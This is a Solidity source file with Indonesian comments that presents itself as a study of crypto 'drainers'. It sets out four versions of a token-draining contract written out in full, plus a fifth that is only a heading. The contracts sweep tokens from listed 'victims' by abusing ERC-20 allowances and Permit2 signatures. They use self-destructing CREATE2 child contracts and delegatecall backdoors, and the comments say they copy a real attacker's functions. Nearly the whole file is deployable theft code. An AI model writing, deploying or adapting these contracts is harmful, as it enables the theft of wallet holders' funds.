// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// BELAJAR DRAINER — EVOLUSI LENGKAP
// ============================================================
// V1: Basic — 1 contract, direct loop
// V2: 2-Layer — main + exploit child
// V3: 8 Selectors — mirip attacker custom functions
// V4: Complete — Permit2 + auto-scan + multi-chain
// V5: Assembly — Huff-style dispatch (bonus skeleton)
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address,address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
}

// ============================================================
// V1: BASIC DRAINER
// ============================================================
// Paling sederhana — 1 contract, loop semua victim
// Logic: approve → addVictim → drainAll → transferFrom

contract DrainerV1_Basic {
    address public owner;
    address[] public victims;
    address[] public tokens;
    
    constructor() { owner = msg.sender; }
    
    function setup(address[] memory _tokens) external {
        require(msg.sender == owner); tokens = _tokens;
    }
    
    function add(address[] memory _v) external {
        require(msg.sender == owner); victims = _v;
    }
    
    function drain() external returns (uint) {
        require(msg.sender == owner);
        uint total;
        for (uint v = 0; v < victims.length; v++) {
            for (uint t = 0; t < tokens.length; t++) {
                uint allow = IERC20(tokens[t]).allowance(victims[v], address(this));
                if (allow == 0) continue;
                uint bal = IERC20(tokens[t]).balanceOf(victims[v]);
                uint amt = allow < bal ? allow : bal;
                if (amt > 0 && IERC20(tokens[t]).transferFrom(victims[v], owner, amt))
                    total += amt;
            }
        }
        return total;
    }
    
    function kill() external { require(msg.sender == owner); selfdestruct(payable(owner)); }
}

// ============================================================
// V2: 2-LAYER DRAINER + EXPLOIT CHILD
// ============================================================
// Layer 1 (DrainerV2_Main): tempat approve, tetap hidup
// Layer 2 (DrainerV2_Child): CREATE2 → drain → selfdestruct
// Pattern: attacker deploy 4 anak, masing-masing drain batch

contract DrainerV2_Main {
    address public owner;       // Slot 0
    address[] public victims;
    mapping(address => bool) public isVictim;
    address[] public tokens;
    mapping(address => bool) public isToken;
    uint public exploitCount;
    
    constructor() { owner = msg.sender; }
    
    function setup(address[] calldata _tokens) external {
        require(msg.sender == owner);
        for (uint i = 0; i < _tokens.length; i++) {
            if (!isToken[_tokens[i]]) { isToken[_tokens[i]] = true; tokens.push(_tokens[i]); }
        }
    }
    
    function register(address[] calldata _victims) external {
        require(msg.sender == owner);
        for (uint i = 0; i < _victims.length; i++) {
            if (!isVictim[_victims[i]]) { isVictim[_victims[i]] = true; victims.push(_victims[i]); }
        }
    }
    
    function sweep(address token, address to) external returns (uint) {
        require(msg.sender == owner);
        uint total;
        for (uint i = 0; i < victims.length; i++) {
            address u = victims[i];
            uint a = IERC20(token).allowance(u, address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(u);
            uint amt = a < b ? a : b;
            if (amt > 0 && IERC20(token).transferFrom(u, to, amt)) total += amt;
        }
        return total;
    }
    
    function scan(address token) external view returns (address[] memory list, uint[] memory amounts, uint total) {
        uint c;
        for (uint i = 0; i < victims.length; i++) 
            if (IERC20(token).allowance(victims[i], address(this)) > 0) c++;
        list = new address[](c); amounts = new uint[](c); uint idx;
        for (uint i = 0; i < victims.length; i++) {
            uint a = IERC20(token).allowance(victims[i], address(this));
            if (a > 0) { uint b = IERC20(token).balanceOf(victims[i]); list[idx] = victims[i]; amounts[idx] = a < b ? a : b; total += amounts[idx]; idx++; }
        }
    }
    
    function delegate(address target, bytes calldata data) external {
        require(msg.sender == owner);
        (bool ok,) = target.delegatecall(data); require(ok);
    }
    
    // CREATE2 spawn exploit child
    function spawn(bytes32 salt, address attacker) external returns (address) {
        require(msg.sender == owner);
        DrainerV2_Child c = new DrainerV2_Child{salt: salt}(address(this), attacker);
        exploitCount++;
        return address(c);
    }
    
    function kill() external { require(msg.sender == owner); selfdestruct(payable(owner)); }
}

// Storage layout MUST match DrainerV2_Main for DELEGATECALL
contract DrainerV2_Child {
    address public owner;    // Slot 0 — matches DrainerV2_Main.owner
    address public attacker;  // Slot 1
    
    constructor(address d, address a) { owner = d; attacker = a; }
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            uint a = IERC20(token).allowance(targets[i], address(this));
            if (a == 0) continue;
            uint b = IERC20(token).balanceOf(targets[i]);
            uint amt = a < b ? a : b;
            if (amt > 0) IERC20(token).transferFrom(targets[i], to, amt);
        }
        selfdestruct(payable(to));
    }
}

// ============================================================
// V3: 8 SELECTORS — MIRIP ATTACKER
// ============================================================
// Attacker asli punya 8 custom function selectors
// Kita bikin versi dengan 8 fungsi yang fungsinya sama

contract DrainerV3_8Func {
    address private _o;
    address[] private _v;
    mapping(address => bool) private _vm;
    address[] private _t;
    mapping(address => bool) private _tm;
    uint private _e;
    uint private _d;
    bool private _p;
    uint constant M = 64;
    
    modifier onlyOwner { require(msg.sender == _o); _; }
    constructor() { _o = msg.sender; }
    
    // 1. init(uint256 chainId, address[] tokens)
    function init(uint256, address[] calldata tks) external onlyOwner {
        for (uint i = 0; i < tks.length; i++) {
            if (!_tm[tks[i]]) { _tm[tks[i]] = true; _t.push(tks[i]); }
        }
    }
    // 2. register(address[] victims)
    function register(address[] calldata vct) external onlyOwner {
        for (uint i = 0; i < vct.length; i++) {
            if (!_vm[vct[i]]) { _vm[vct[i]] = true; _v.push(vct[i]); }
        }
    }
    // 3. sweep(address token, address to)
    function sweep(address tk, address to) external onlyOwner returns (uint) {
        uint t;
        for (uint i = 0; i < _v.length; i++) {
            address u = _v[i]; uint a = IERC20(tk).allowance(u, address(this));
            if (a == 0) continue; uint b = IERC20(tk).balanceOf(u); uint amt = a < b ? a : b;
            if (amt > 0 && IERC20(tk).transferFrom(u, to, amt)) t += amt;
        }
        _d += t; return t;
    }
    // 4. report()
    function report() external view returns (address[] memory, address[] memory, uint, uint) {
        return (_v, _t, _v.length, _t.length);
    }
    // 5. control(uint8 action, address param)
    function control(uint8 a, address p) external onlyOwner {
        if (a == 1) _o = p; else if (a == 2) _p = true; else if (a == 3) _p = false; 
        else if (a == 4) selfdestruct(payable(_o)); 
        else if (a == 5) IERC20(p).transfer(_o, IERC20(p).balanceOf(address(this)));
    }
    // 6. inspect(address token, address[] suspects)
    function inspect(address tk, address[] calldata suspects) external view returns (uint[] memory, uint) {
        uint[] memory amts = new uint[](suspects.length); uint tot;
        for (uint i = 0; i < suspects.length; i++) {
            uint a = IERC20(tk).allowance(suspects[i], address(this));
            uint b = IERC20(tk).balanceOf(suspects[i]);
            amts[i] = a < b ? a : b; tot += amts[i];
        }
        return (amts, tot);
    }
    // 7. delegate(address target, bytes data)
    function delegate(address tgt, bytes calldata data) external onlyOwner {
        (bool ok,) = tgt.delegatecall(data); require(ok);
    }
    // 8. spawn(bytes32 salt, address attacker)
    function spawn(bytes32 salt, address atk) external onlyOwner returns (address) {
        DrainerV2_Child c = new DrainerV2_Child{salt: salt}(address(this), atk);
        _e++; return address(c);
    }
}

// ============================================================
// V4: COMPLETE — PERMIT2 + MULTI-CHAIN + AUTO-SCAN
// ============================================================

interface IPermit2 {
    struct Permit { address permitted; uint256 nonce; uint256 deadline; }
    struct Details { address to; uint256 requestedAmount; }
    function permitTransferFrom(Permit calldata, Details calldata, address, bytes calldata) external;
}

contract DrainerV4_Complete {
    address private _o; uint private _c; uint private _d; uint private _e; bool private _p;
    IPermit2 constant P2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    uint constant M = 64;
    
    modifier onlyOwner { require(msg.sender == _o); _; }
    constructor() { _o = msg.sender; _c = block.chainid; }
    
    // 1. init
    function init(uint256 cid, address[] calldata) external onlyOwner { _c = cid; }
    
    // 2. sweep — zero storage: victims passed as params
    function sweep(address[] calldata tks, address[] calldata vct, address to) external onlyOwner returns (uint) {
        uint total;
        for (uint t = 0; t < tks.length && t < M; t++) {
            for (uint v = 0; v < vct.length && v < M; v++) {
                address u = vct[v]; address tk = tks[t];
                uint a = IERC20(tk).allowance(u, address(this));
                if (a == 0) continue; uint b = IERC20(tk).balanceOf(u);
                uint amt = a < b ? a : b;
                if (amt > 0 && IERC20(tk).transferFrom(u, to, amt)) total += amt;
            }
        }
        _d += total; return total;
    }
    
    // 3. discover — auto-scan victims from list
    function discover(address tk, address[] calldata suspects, address to) external onlyOwner returns (uint) {
        uint total;
        for (uint i = 0; i < suspects.length && i < M; i++) {
            uint a = IERC20(tk).allowance(suspects[i], address(this));
            if (a == 0) continue; uint b = IERC20(tk).balanceOf(suspects[i]);
            uint amt = a < b ? a : b;
            if (amt > 0 && IERC20(tk).transferFrom(suspects[i], to, amt)) total += amt;
        }
        _d += total; return total;
    }
    
    // 4. stats
    function stats() external view returns (uint, uint, bool, uint) { return (_c, _d, _p, _e); }
    
    // 5. control
    function control(uint8 a, address p) external onlyOwner {
        if (a == 1) _o = p; else if (a == 2) _p = true; else if (a == 3) _p = false;
        else if (a == 4) selfdestruct(payable(_o));
        else if (a == 5) IERC20(p).transfer(_o, IERC20(p).balanceOf(address(this)));
    }
    
    // 6. inspect
    function inspect(address tk, address[] calldata suspects) external view returns (uint[] memory, uint) {
        uint[] memory amts = new uint[](suspects.length); uint tot;
        for (uint i = 0; i < suspects.length; i++) {
            uint a = IERC20(tk).allowance(suspects[i], address(this));
            uint b = IERC20(tk).balanceOf(suspects[i]);
            amts[i] = a < b ? a : b; tot += amts[i];
        }
        return (amts, tot);
    }
    
    // 7. delegate
    function delegate(address tgt, bytes calldata data) external onlyOwner {
        (bool ok,) = tgt.delegatecall(data); require(ok);
    }
    
    // 8. spawn
    function spawn(bytes32 salt, address atk) external onlyOwner returns (address) {
        DrainerV2_Child c = new DrainerV2_Child{salt: salt}(address(this), atk);
        _e++; return address(c);
    }
    
    // 9. permitSingle
    function permit1(address tk, address from, uint amt, uint nonce, uint deadline, bytes calldata sig, address to) external onlyOwner {
        uint a = amt == 0 ? IERC20(tk).balanceOf(from) : amt;
        P2.permitTransferFrom(IPermit2.Permit(address(this), nonce, deadline), IPermit2.Details(to, a), from, sig);
        IERC20(tk).transferFrom(from, to, a); _d += a;
    }
    
    // 10. permitBatch
    function permitN(address tk, address[] calldata from, uint[] calldata amts, uint[] calldata nonces, uint[] calldata deadlines, bytes[] calldata sigs, address to) external onlyOwner {
        _pB(tk, from, amts, nonces, deadlines, sigs, to);
    }
    
    function _pB(address tk, address[] calldata from, uint[] calldata amts, uint[] calldata nonces, uint[] calldata deadlines, bytes[] calldata sigs, address to) private {
        uint len = from.length < M ? from.length : M;
        for (uint i = 0; i < len; i++) {
            _p1(tk, from[i], amts[i], nonces[i], deadlines[i], sigs[i], to);
        }
    }
    
    function _p1(address tk, address frm, uint amt, uint nonce, uint deadline, bytes calldata sig, address to) private {
        uint a = amt == 0 ? IERC20(tk).balanceOf(frm) : amt;
        P2.permitTransferFrom(IPermit2.Permit(address(this), nonce, deadline), IPermit2.Details(to, a), frm, sig);
        IERC20(tk).transferFrom(frm, to, a); _d += a;
    }
}

// ============================================================
// V5: ASSEMBLY DISPATCH — Huff-style (SKELETON)
// ============================================================
// Compile dengan: huffc Drainer.huff
// Gak ada ABI, gak ada nama fungsi di bytecode
// ⚠️ INI SKELETON — need full rewrite di Huff/Huff-asm
// ============================================================

// ============================================================
// RINGKASAN EVOLUSI
// ============================================================
// V1 → Basic loop drain, 1 contract
// V2 → 2-layer: main + child, CREATE2 + DELEGATECALL + selfdestruct
// V3 → 8 fungsi custom, pattern mirip attacker
// V4 → Permit2 + multi-chain + auto-scan + zero storage
// V5 → Assembly dispatch (Huff, perlu setup terpisah)
// ============================================================
